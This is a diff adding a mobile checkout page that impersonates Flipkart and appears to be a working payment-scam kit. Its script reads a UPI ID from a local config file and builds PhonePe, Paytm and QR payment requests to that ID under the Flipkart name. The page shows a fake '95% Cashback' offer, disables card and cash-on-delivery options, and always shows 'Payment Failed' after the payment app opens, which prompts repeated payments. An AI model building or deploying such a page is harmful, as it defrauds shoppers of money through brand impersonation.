@@ -1,0 +1,953 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Checkout - My Store</title>
+    <meta
+      name="viewport"
+      content="width=device-width,minimum-scale=1,user-scalable=no"
+    />
+    <link
+      rel="icon"
+      href="https://static-assets-web.flixcart.com/www/promos/new/20150528-140547-favicon-retina.ico"
+      type="image/png"
+    />
+
+    <!-- 2. HTML Level Extreme Cache Prevention -->
+    <meta
+      http-equiv="Cache-Control"
+      content="no-cache, no-store, must-revalidate"
+    />
+    <meta http-equiv="Pragma" content="no-cache" />
+    <meta http-equiv="Expires" content="0" />
+
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap"
+      rel="stylesheet"
+    />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap"
+      rel="stylesheet"
+    />
+
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+
+    <!-- jQuery & QRCode JS -->
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+
+    <script>
+      // ✨ SMART AUTO-DETECTOR URL LOGIC ✨
+      var loc = window.location.pathname.split("/");
+      if (loc[loc.length - 1] === "") loc.pop();
+      if (loc[loc.length - 1] && loc[loc.length - 1].indexOf(".") !== -1)
+        loc.pop();
+      if (loc[loc.length - 1] === "payment") loc.pop();
+      var MAIN_URL = window.location.origin + loc.join("/") + "/";
+
+function fetchInfoJson() {
+  var url = "../info.json";
+
+  return fetch(url, { cache: "no-store" }).then(function (response) {
+    if (!response.ok) return null;
+    return response.json();
+  });
+}
+
+      // Payment Logic Variables (UNTOUCHED)
+      var MERCHANT_NAME = "Flipkart";
+      var pt = "";
+      var pp = "";
+      var qr = "";
+      var trRef = "";
+    </script>
+
+    <style>
+      /* 🛡️ ANTI-SELECT & ANTI-DRAG CSS */
+      * {
+        -webkit-user-select: none !important;
+        -moz-user-select: none !important;
+        -ms-user-select: none !important;
+        user-select: none !important;
+        -webkit-user-drag: none !important;
+      }
+      input,
+      textarea,
+      select {
+        -webkit-user-select: auto !important;
+        -moz-user-select: auto !important;
+        -ms-user-select: auto !important;
+        user-select: auto !important;
+      }
+
+      body {
+        font-family: "Inter", sans-serif;
+        background: #f1f3f6;
+        max-width: 480px;
+        margin: 0 auto;
+        color: #212121;
+        -webkit-tap-highlight-color: transparent;
+      }
+
+      header {
+        position: sticky;
+        top: 0;
+        background: #fff;
+        z-index: 30;
+        padding: 12px;
+        box-shadow: 0 1px 4px rgba(0, 0, 0, 0.05);
+      }
+
+      .total-card {
+        background: #f0f8ff;
+        border-radius: 8px;
+        padding: 12px;
+        margin-top: 8px;
+      }
+
+      .price-details {
+        max-height: 160px;
+        overflow: hidden;
+        transition: all 0.3s ease-in-out;
+      }
+
+      .cashback-glow {
+        position: relative;
+        display: inline-block;
+        color: #15803d;
+        font-weight: 800;
+      }
+
+      .cashback-glow::after {
+        content: attr(data-text);
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        background-image: linear-gradient(
+          120deg,
+          transparent 0%,
+          transparent 35%,
+          rgba(255, 255, 255, 0.9) 50%,
+          transparent 65%,
+          transparent 100%
+        );
+        background-size: 200% 100%;
+        -webkit-background-clip: text;
+        color: transparent;
+        animation: cashbackShine 2.5s infinite linear;
+        pointer-events: none;
+      }
+
+      @keyframes cashbackShine {
+        0% {
+          background-position: -200% 0;
+        }
+        100% {
+          background-position: 200% 0;
+        }
+      }
+
+      .pay-option {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        padding: 14px;
+        border: 1px solid #e0e0e0;
+        border-radius: 8px;
+        margin-bottom: 10px;
+        cursor: pointer;
+        transition: all 0.2s;
+        background: white;
+      }
+
+      .pay-option.selected {
+        background: #f0f9ff;
+        border-color: #2874f0;
+        box-shadow: 0 0 0 1px #2874f0;
+      }
+
+      .opt-left {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+      }
+      .opt-img {
+        width: 30px;
+        height: 30px;
+        object-fit: contain;
+      }
+
+      .opt-name {
+        font-size: 14px;
+        font-weight: 600;
+        color: #212121;
+        display: block;
+      }
+      .opt-tag {
+        font-size: 10px;
+        font-weight: 700;
+        color: #16a34a;
+        background: #dcfce7;
+        padding: 2px 6px;
+        border-radius: 4px;
+        margin-left: 6px;
+      }
+
+      .radio-circle {
+        width: 18px;
+        height: 18px;
+        border: 2px solid #ccc;
+        border-radius: 50%;
+        position: relative;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+      .pay-option.selected .radio-circle {
+        border-color: #2874f0;
+      }
+
+      .radio-dot {
+        width: 10px;
+        height: 10px;
+        background: #2874f0;
+        border-radius: 50%;
+        display: none;
+      }
+      .pay-option.selected .radio-dot {
+        display: block;
+      }
+
+      .overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.6);
+        z-index: 200;
+        display: none;
+        backdrop-filter: blur(2px);
+      }
+
+      .modal {
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%) scale(0.9);
+        background: white;
+        width: 85%;
+        max-width: 340px;
+        border-radius: 12px;
+        padding: 25px;
+        text-align: center;
+        opacity: 0;
+        pointer-events: none;
+        transition: 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        z-index: 201;
+        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+      }
+
+      .modal.active {
+        opacity: 1;
+        pointer-events: auto;
+        transform: translate(-50%, -50%) scale(1);
+      }
+
+      .spinner {
+        width: 45px;
+        height: 45px;
+        border: 3px solid #f3f3f3;
+        border-top: 3px solid #2874f0;
+        border-radius: 50%;
+        margin: 0 auto 15px;
+        animation: spin 0.8s linear infinite;
+      }
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+
+      .modal-title {
+        font-size: 18px;
+        font-weight: 700;
+        color: #141414;
+        margin-bottom: 8px;
+      }
+      .modal-desc {
+        font-size: 13px;
+        color: #666;
+        line-height: 1.5;
+        margin-bottom: 20px;
+      }
+
+      .warning-box {
+        background: #fff8e1;
+        color: #b45309;
+        font-size: 12px;
+        padding: 10px;
+        border-radius: 6px;
+        border: 1px solid #ffecb3;
+        font-weight: 600;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 6px;
+      }
+
+      .cross-circle {
+        width: 60px;
+        height: 60px;
+        background: #fee2e2;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin: 0 auto 15px;
+      }
+
+      .retry-btn {
+        background: #2874f0;
+        color: white;
+        width: 100%;
+        padding: 12px;
+        border: none;
+        border-radius: 8px;
+        font-weight: 700;
+        font-size: 15px;
+        cursor: pointer;
+        box-shadow: 0 4px 10px rgba(40, 116, 240, 0.3);
+      }
+
+      #qrModal {
+        padding: 0;
+        overflow: hidden;
+        border: 1px solid #e0eaff;
+      }
+      .qr-header {
+        background: #2874f0;
+        color: white;
+        padding: 16px;
+        display: flex;
+        align-items: center;
+        gap: 15px;
+      }
+      .qr-header svg {
+        cursor: pointer;
+      }
+      .qr-header h3 {
+        margin: 0;
+        font-size: 17px;
+        font-weight: 600;
+      }
+      .qr-body {
+        padding: 25px 20px;
+        background: #f0f6ff;
+        text-align: center;
+      }
+      .qr-container {
+        background: white;
+        padding: 16px;
+        border-radius: 12px;
+        display: inline-block;
+        box-shadow: 0 4px 15px rgba(40, 116, 240, 0.15);
+        margin-bottom: 15px;
+      }
+
+      .footer-btn {
+        background: #fb641b;
+        color: white;
+        border: none;
+        width: 100%;
+        padding: 14px;
+        border-radius: 4px;
+        font-size: 16px;
+        font-weight: 700;
+        box-shadow: 0 2px 8px rgba(251, 100, 27, 0.4);
+        cursor: pointer;
+        transition: background 0.2s;
+      }
+      .footer-btn:active {
+        transform: scale(0.98);
+      }
+    </style>
+  </head>
+  <body>
+    <!-- Header -->
+    <header>
+      <div class="flex items-center justify-between">
+        <div class="flex items-center gap-3">
+          <button class="p-1 text-gray-700" onclick="history.back()">
+            <!-- SVG Back Arrow -->
+            <svg
+              width="22"
+              height="22"
+              viewBox="0 0 24 24"
+              fill="none"
+              stroke="currentColor"
+              stroke-width="2.5"
+              stroke-linecap="round"
+              stroke-linejoin="round"
+            >
+              <path d="M19 12H5M12 19l-7-7 7-7" />
+            </svg>
+          </button>
+          <div class="flex flex-col leading-tight">
+            <span
+              class="text-[11px] text-gray-500 font-medium tracking-wide uppercase"
+              >Step 3 of 3</span
+            >
+            <span class="text-[17px] font-bold text-gray-900">Payments</span>
+          </div>
+        </div>
+        <div
+          class="flex items-center gap-1 bg-blue-50 border border-blue-100 rounded px-2 py-1 text-[11px] font-semibold text-blue-700"
+        >
+          <svg
+            width="12"
+            height="12"
+            viewBox="0 0 24 24"
+            fill="none"
+            stroke="currentColor"
+            stroke-width="2"
+            stroke-linecap="round"
+            stroke-linejoin="round"
+          >
+            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+          </svg>
+          100% Secure
+        </div>
+      </div>
+
+      <div class="total-card shadow-sm">
+        <div class="price-details" id="price-details">
+          <div class="flex items-center gap-4 mb-3">
+            <img
+              id="item_image"
+              src=""
+              alt="Product"
+              class="w-[60px] h-[60px] object-contain rounded bg-white p-1 border border-gray-200"
+            />
+            <div>
+              <div
+                class="font-semibold text-[14px] text-gray-900 line-clamp-1"
+                id="product-title"
+              >
+                Loading Product...
+              </div>
+              <div class="mt-1">
+                <span class="text-[#2874f0] font-bold text-[16px] selling_price"
+                  >₹0</span
+                >
+                <span class="text-gray-500 text-[12px] line-through ml-1 mrp"
+                  >₹0</span
+                >
+              </div>
+            </div>
+          </div>
+          <hr class="my-2 border-gray-200" />
+        </div>
+        <div
+          class="flex justify-between items-center mt-1"
+          onclick="togglePriceDetails()"
+        >
+          <div
+            class="text-[#2874f0] font-semibold text-[13px] cursor-pointer flex items-center gap-1"
+          >
+            Total Amount
+            <svg
+              id="price-chevron"
+              width="12"
+              height="12"
+              viewBox="0 0 24 24"
+              fill="none"
+              stroke="currentColor"
+              stroke-width="2.5"
+              stroke-linecap="round"
+              stroke-linejoin="round"
+              class="transition-transform"
+            >
+              <polyline points="18 15 12 9 6 15"></polyline>
+            </svg>
+          </div>
+          <span class="font-bold text-[16px] text-gray-900 selling_price"
+            >₹0</span
+          >
+        </div>
+      </div>
+    </header>
+
+    <!-- Offer Banner -->
+    <section class="bg-white py-3 border-b border-gray-200 mt-2 shadow-sm">
+      <div class="px-4">
+        <div
+          class="bg-green-50 border border-green-200 rounded-lg p-3 flex items-center justify-between"
+        >
+          <div>
+            <div class="text-[15px]">
+              <span class="cashback-glow" data-text="95% Cashback"
+                >95% Cashback</span
+              >
+            </div>
+            <div class="text-[11px] font-medium text-green-700 mt-0.5">
+              Claim now with UPI payment offers
+            </div>
+          </div>
+          <div class="flex items-center gap-1">
+            <span
+              class="inline-flex items-center justify-center w-8 h-8 rounded-full bg-white border border-gray-100 shadow-sm z-10"
+            >
+              <img
+                class="w-[18px] h-[18px]"
+                src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-gringotts/images/banks/AXIS.svg"
+              />
+            </span>
+            <span
+              class="inline-flex items-center justify-center w-8 h-8 rounded-full bg-white border border-gray-100 shadow-sm -ml-3 z-0"
+            >
+              <img
+                class="w-[18px] h-[18px]"
+                src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-gringotts/images/banks/SBI.svg"
+              />
+            </span>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Payment Options -->
+    <section class="bg-white mt-2 pb-4 shadow-sm">
+      <div class="flex items-center gap-3 p-4 border-b border-gray-100">
+        <img
+          src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-gringotts/images/upi.svg"
+          class="w-8"
+        />
+        <div>
+          <h3 class="font-bold text-[15px] text-gray-900">UPI</h3>
+          <p class="text-[12px] text-gray-500">Pay by any UPI app</p>
+        </div>
+      </div>
+
+      <div class="p-4">
+        <!-- PhonePe -->
+        <div
+          class="pay-option selected"
+          onclick="selectMethod('phonepe', this)"
+        >
+          <div class="opt-left">
+            <img src="../assets/images/phonepe.svg" class="opt-img" />
+            <div>
+              <span class="opt-name">PhonePe</span>
+              <span class="opt-tag">Fastest</span>
+            </div>
+          </div>
+          <div class="radio-circle"><div class="radio-dot"></div></div>
+        </div>
+
+        <!-- Paytm -->
+        <div class="pay-option" onclick="selectMethod('paytm', this)">
+          <div class="opt-left">
+            <img src="../assets/images/paytm_icon.svg" class="opt-img" />
+            <span class="opt-name">Paytm</span>
+          </div>
+          <div class="radio-circle"><div class="radio-dot"></div></div>
+        </div>
+
+        <!-- QR Code -->
+        <div class="pay-option" onclick="selectMethod('qr_upi', this)">
+          <div class="opt-left">
+            <img src="../assets/images/qr.png" class="opt-img" />
+            <span class="opt-name">Scan QR Code</span>
+          </div>
+          <div class="radio-circle"><div class="radio-dot"></div></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Disabled Options -->
+    <div class="bg-white mt-2 shadow-sm divide-y divide-gray-100">
+      <div
+        class="flex items-start gap-4 px-4 py-4 opacity-50 grayscale pointer-events-none"
+      >
+        <img
+          class="w-6"
+          src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-gringotts/images/card.svg"
+        />
+        <div class="flex-1">
+          <div class="flex justify-between items-center">
+            <h3 class="text-[14px] font-semibold text-gray-800">
+              Credit / Debit / ATM Card
+            </h3>
+            <span
+              class="text-[10px] bg-gray-200 text-gray-600 px-2 py-1 rounded font-bold"
+              >UNAVAILABLE</span
+            >
+          </div>
+        </div>
+      </div>
+      <div
+        class="flex items-start gap-4 px-4 py-4 opacity-50 grayscale pointer-events-none"
+      >
+        <img
+          class="w-6"
+          src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-gringotts/images/net-banking-08092023.svg"
+        />
+        <div class="flex-1">
+          <div class="flex justify-between items-center">
+            <h3 class="text-[14px] font-semibold text-gray-800">Net Banking</h3>
+            <span
+              class="text-[10px] bg-gray-200 text-gray-600 px-2 py-1 rounded font-bold"
+              >UNAVAILABLE</span
+            >
+          </div>
+        </div>
+      </div>
+      <div
+        class="flex items-start gap-4 px-4 py-4 opacity-50 grayscale pointer-events-none"
+      >
+        <img
+          class="w-6"
+          src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-gringotts/images/cash-icon.svg"
+        />
+        <div class="flex-1">
+          <div class="flex justify-between items-center">
+            <h3 class="text-[14px] font-semibold text-gray-800">
+              Cash on Delivery
+            </h3>
+            <span
+              class="text-[10px] bg-gray-200 text-gray-600 px-2 py-1 rounded font-bold"
+              >UNAVAILABLE</span
+            >
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="h-24"></div>
+
+    <!-- Fixed Bottom Footer -->
+    <div
+      class="fixed bottom-0 w-full bg-white border-t border-gray-200 p-3 flex justify-between items-center shadow-[0_-2px_10px_rgba(0,0,0,0.05)] z-40"
+      style="max-width: 480px; left: 50%; transform: translateX(-50%)"
+    >
+      <button
+        class="footer-btn flex justify-center items-center gap-2"
+        id="action-button"
+        onclick="payNow()"
+      >
+        Pay <span class="selling_price">₹0</span>
+      </button>
+    </div>
+
+    <!-- OVERLAYS & MODALS -->
+    <div class="overlay" id="overlay"></div>
+
+    <!-- Processing Modal -->
+    <div class="modal" id="waitingModal">
+      <div class="spinner"></div>
+      <h3 class="modal-title">Processing Payment</h3>
+      <p class="modal-desc">
+        Request sent to your UPI app.<br />Please approve the payment to
+        complete your order.
+      </p>
+      <div class="warning-box">
+        <svg
+          width="16"
+          height="16"
+          viewBox="0 0 24 24"
+          fill="none"
+          stroke="currentColor"
+          stroke-width="2.5"
+          stroke-linecap="round"
+          stroke-linejoin="round"
+        >
+          <path
+            d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"
+          ></path>
+          <line x1="12" y1="9" x2="12" y2="13"></line>
+          <line x1="12" y1="17" x2="12.01" y2="17"></line>
+        </svg>
+        Do not press back or close this app
+      </div>
+    </div>
+
+    <!-- Failed Modal -->
+    <div class="modal" id="failedModal">
+      <div class="cross-circle">
+        <svg
+          width="32"
+          height="32"
+          viewBox="0 0 24 24"
+          fill="none"
+          stroke="#ef4444"
+          stroke-width="3"
+          stroke-linecap="round"
+          stroke-linejoin="round"
+        >
+          <line x1="18" y1="6" x2="6" y2="18"></line>
+          <line x1="6" y1="6" x2="18" y2="18"></line>
+        </svg>
+      </div>
+      <h3 class="modal-title" style="color: #d10000">Payment Failed</h3>
+      <p class="modal-desc">
+        The transaction could not be completed. If any amount was deducted, it
+        will be refunded within 1-2 working days.
+      </p>
+      <button class="retry-btn" onclick="closeModal('failedModal')">
+        Try Again
+      </button>
+    </div>
+
+    <!-- Blue Theme QR Code Modal -->
+    <div class="modal" id="qrModal">
+      <div class="qr-header">
+        <svg
+          onclick="closeModal('qrModal')"
+          width="24"
+          height="24"
+          viewBox="0 0 24 24"
+          fill="none"
+          stroke="currentColor"
+          stroke-width="2.5"
+          stroke-linecap="round"
+          stroke-linejoin="round"
+        >
+          <path d="M19 12H5M12 19l-7-7 7-7" />
+        </svg>
+        <h3>Scan & Pay</h3>
+      </div>
+      <div class="qr-body">
+        <img
+          src="../xxx/Q18Ifxk.png"
+          style="height: 28px; margin: 0 auto 20px; object-fit: contain"
+        />
+        <div class="qr-container" id="qr-box">
+          <!-- QR Code injected here -->
+        </div>
+        <div
+          class="font-bold text-[22px] text-[#2874f0] mt-2 mb-3 selling_price"
+        >
+          ₹0
+        </div>
+        <div class="flex justify-center gap-4 opacity-80">
+          <img src="../assets/images/phonepe.svg" width="28" />
+          <img src="../assets/images/paytm_icon.svg" width="28" />
+          <img src="https://img.icons8.com/color/48/bhim.png" width="28" />
+        </div>
+      </div>
+    </div>
+
+    <script>
+      // ==========================================
+      // 💰 PAYMENT LOGIC (UNTOUCHED)
+      // ==========================================
+      function formatINR(amount) {
+        return Number(amount).toLocaleString("en-IN");
+      }
+
+      function togglePriceDetails() {
+        const d = document.getElementById("price-details");
+        const c = document.getElementById("price-chevron");
+        if (d.style.maxHeight === "0px") {
+          d.style.maxHeight = "160px";
+          d.style.opacity = "1";
+          c.style.transform = "rotate(0deg)";
+        } else {
+          d.style.maxHeight = "0px";
+          d.style.opacity = "0";
+          c.style.transform = "rotate(180deg)";
+        }
+      }
+
+      function showModal(id) {
+        document.getElementById("overlay").style.display = "block";
+        setTimeout(
+          () => document.getElementById(id).classList.add("active"),
+          10
+        );
+      }
+
+      function closeModal(id) {
+        document.getElementById(id).classList.remove("active");
+        setTimeout(
+          () => (document.getElementById("overlay").style.display = "none"),
+          300
+        );
+      }
+
+      let itemData = {};
+      let selectedMethod = "phonepe";
+
+      function applyUpiConfig(u) {
+        if (!u) return;
+        // webinfo.json: name = UPI, email = tr
+        const upiId = String(u.name || "").trim();
+        const trVal = String(u.email || "").trim();
+        pt = upiId;
+        pp = upiId;
+        qr = upiId;
+        trRef = trVal;
+      }
+
+      $(document).ready(function () {
+        fetchInfoJson()
+          .then(function (data) {
+            if (data) applyUpiConfig(data);
+            else console.error("UPI info.json not found");
+          })
+          .catch(function (error) {
+            console.error("Error fetching UPI data:", error);
+          });
+
+        const storedVariant = localStorage.getItem("selected_verient");
+        if (storedVariant) {
+          itemData = JSON.parse(storedVariant);
+        }
+
+        if (itemData.img1) $("#item_image").attr("src", itemData.img1);
+
+        const name =
+          (itemData.name || "Product") +
+          (itemData.color ? " (" + itemData.color + ")" : "");
+        $("#product-title").html(name);
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const passedAmt = urlParams.get("amt");
+
+        const sp =
+          parseFloat(passedAmt) || parseInt(itemData.selling_price) || 0;
+        const mrp = parseInt(itemData.mrp) || 0;
+
+        $(".selling_price").html("₹" + formatINR(sp));
+        $(".mrp").html("₹" + formatINR(mrp));
+        itemData.selling_price = sp;
+
+        updateActionButton();
+      });
+
+      function selectMethod(method, element) {
+        if (navigator.vibrate) navigator.vibrate(20);
+        selectedMethod = method;
+
+        document
+          .querySelectorAll(".pay-option")
+          .forEach((el) => el.classList.remove("selected"));
+        element.classList.add("selected");
+
+        updateActionButton();
+      }
+
+      function updateActionButton() {
+        const btn = document.getElementById("action-button");
+        const sp = parseInt(itemData.selling_price) || 0;
+
+        if (selectedMethod === "qr_upi") {
+          btn.innerHTML = "View QR Code";
+        } else {
+          btn.innerHTML = `Pay ₹${formatINR(sp)}`;
+        }
+      }
+
+      function payNow() {
+        if (navigator.vibrate) navigator.vibrate(40);
+
+        const amt = (parseFloat(itemData.selling_price) || 0).toFixed(2);
+
+        const randomNum = Math.floor(Math.random() * 9000000000) + 1000000000;
+        const txnNote = "Paying To Flipkart ORDER" + randomNum;
+
+        if (selectedMethod === "qr_upi") {
+          generateQR(amt, txnNote, randomNum);
+          return;
+        }
+
+        showModal("waitingModal");
+
+        let redirect_url = "";
+        const pn_encoded = encodeURIComponent(MERCHANT_NAME);
+
+        setTimeout(() => {
+          if (selectedMethod === "phonepe") {
+            var payload = {
+              p2pPaymentCheckoutParams: {
+                checkoutType: "COLLECT",
+                initialAmount: parseInt(amt) * 100,
+                note: {
+                  type: "text",
+                  message: txnNote,
+                },
+                supportedInstruments: -1,
+              },
+              contact: {
+                type: "EXTERNAL_MERCHANT",
+                name: MERCHANT_NAME,
+                vpa: pp,
+              },
+            };
+
+            var base64Data = btoa(JSON.stringify(payload));
+
+            var redirect_url =
+              "phonepe://native?data=" +
+              encodeURIComponent(base64Data) +
+              "&id=p2ppayment";
+          } else if (selectedMethod === "paytm") {
+            redirect_url = `paytmmp://cash_wallet?pa=${pt}&pn=${pn_encoded}&am=${amt}&cu=INR&tn=${encodeURIComponent(
+              txnNote
+            )}&featuretype=money_transfer`;
+          }
+
+          if (redirect_url) {
+            window.location.href = redirect_url;
+          }
+
+          setTimeout(() => {
+            closeModal("waitingModal");
+            showModal("failedModal");
+            if (navigator.vibrate) navigator.vibrate([50, 50, 50]);
+          }, 8000);
+        }, 1200);
+      }
+
+      function generateQR(amount, note, txnId) {
+        const box = document.getElementById("qr-box");
+        box.innerHTML = "";
+
+        const upiLink = `upi://pay?pa=${qr}&pn=${encodeURIComponent(
+          MERCHANT_NAME
+        )}&am=${amount}&tr=${encodeURIComponent(
+          trRef || txnId
+        )}&tn=${encodeURIComponent(note)}`;
+
+        new QRCode(box, {
+          text: upiLink,
+          width: 180,
+          height: 180,
+          colorDark: "#000000",
+          colorLight: "#ffffff",
+          correctLevel: QRCode.CorrectLevel.H,
+        });
+
+        showModal("qrModal");
+      }
+    </script>
+    <script
+      type="module"
+      src="https://static.cloudflareinsights.com/beacon.min.js/v4513226cdae34746b4dedf0b4dfa099e1781791509496"
+      integrity="sha512-ZE9pZaUXND66v380QUtch/5sE9tPFh2zg45pR2PB0CVkCtOREv2AJKkSidISWkysEuQ0EH8faUU5du78bx87UQ=="
+      data-cf-beacon='{"version":"2024.11.0","token":"c6604ce2f3ff491e85b417450e314113","r":1}'
+      crossorigin="anonymous"
+    ></script>
+  </body>
+</html>
+<!-- SALT_50c6b8b77184b31bccf5fbe10ffb3bce -->
